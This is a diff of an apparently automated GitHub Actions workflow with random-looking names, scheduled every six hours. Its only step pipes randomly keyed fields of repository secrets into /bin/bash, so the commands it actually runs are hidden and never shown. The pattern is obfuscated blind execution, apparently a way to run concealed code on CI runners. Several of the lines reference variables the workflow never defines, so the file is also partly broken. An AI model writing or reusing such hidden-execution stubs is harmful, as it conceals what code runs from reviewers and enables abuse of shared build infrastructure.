@@ -1,29 +1,20 @@
 name: zhangzuqing3131
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 1/6 * * *'
-
-jobs:  # 9193
+    - cron: '29 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangzuqing3131
         env:
-          sm21092: ${{ secrets.sm21092 }}
+          wxqv4882: ${{ secrets.wxqv4882 }}
         run: |
-          echo $sm21092 | jq -r .icnkj98984 | /bin/bash
-          echo $tqus0208 | jq -r .bdxht210 | /bin/bash
-          echo $fojqc35 | jq -r .g31 | /bin/bash
-          echo $ezgas23693 | jq -r .lvu75 | /bin/bash
-          echo $bn63231 | jq -r .bwj6 | /bin/bash
-          echo $uu5 | jq -r .wuj49756 | /bin/bash
-          echo $mdvs66 | jq -r .e9095 | /bin/bash
-          echo $l38400 | jq -r .op6 | /bin/bash
-          echo $jhous14 | jq -r .mbnux9274 | /bin/bash
-          echo $bh1432 | jq -r .tvpl3732 | /bin/bash
-          echo $h475 | jq -r .zi039 | /bin/bash
-          echo $tg5 | jq -r .ytu29 | /bin/bash
+          echo $wxqv4882 | jq -r .uhwkx58 | /bin/bash
+          echo $uwfy13 | jq -r .fqpn126 | /bin/bash
+          echo $ipfzd3 | jq -r .mnaw3 | /bin/bash
+          echo $kycz133 | jq -r .khs53 | /bin/bash
 
